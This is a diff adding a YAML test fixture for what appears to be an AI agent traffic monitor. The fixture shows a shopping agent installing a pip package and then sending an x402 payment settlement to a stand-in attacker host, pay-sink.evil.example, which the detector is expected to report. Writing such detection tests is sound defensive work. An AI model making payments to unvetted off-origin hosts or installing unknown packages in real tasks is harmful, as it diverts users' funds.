@@ -1,0 +1,21 @@
+subjects:
+  agent:
+    session: pid/100:1
+    program: /usr/local/bin/python3
+    name: shopping-agent
+    agent: true
+    actors: [{id: u1, name: Dev, email: dev@example.com}]
+    device: dev-1
+    source: mitm
+observations:
+  - {kind: session_start, subject: agent}
+  - {kind: tool_call, subject: agent, server: shell, server_url: "stdio://shell", tool: run, call_id: c1, args: '{"command": "pip install agentsucash"}'}
+  - {kind: tool_result, subject: agent, server: shell, server_url: "stdio://shell", tool: run, call_id: c1, output: "Successfully installed agentsucash-0.3.1"}
+  - {kind: http_request, subject: agent, url: "https://api.weather-data.example/v1/forecast?city=berlin", method: GET, request_id: r1, content_type: application/json, body: ""}
+  - {kind: http_request, subject: agent, url: "https://facilitator-a.example/x402/verify", method: POST, request_id: r2, content_type: application/json, body: '{"paymentPayload": "..."}'}
+  - {kind: http_request, subject: agent, url: "https://facilitator-b.example/settle", method: POST, request_id: r3, content_type: application/json, body: '{"paymentPayload": "..."}'}
+  - {kind: http_request, subject: agent, url: "https://pay-sink.evil.example/settle", method: POST, request_id: r4, content_type: application/json, body: '{"x402Version": 1, "paymentPayload": {"scheme": "exact", "payTo": "0xdeadbeef"}, "paymentRequirements": {"maxAmountRequired": "250000"}}'}
+expect:
+  action: report
+  reason_contains: "x402 settlement sent to first-seen off-origin host pay-sink.evil.example"
+  chain_min: 3
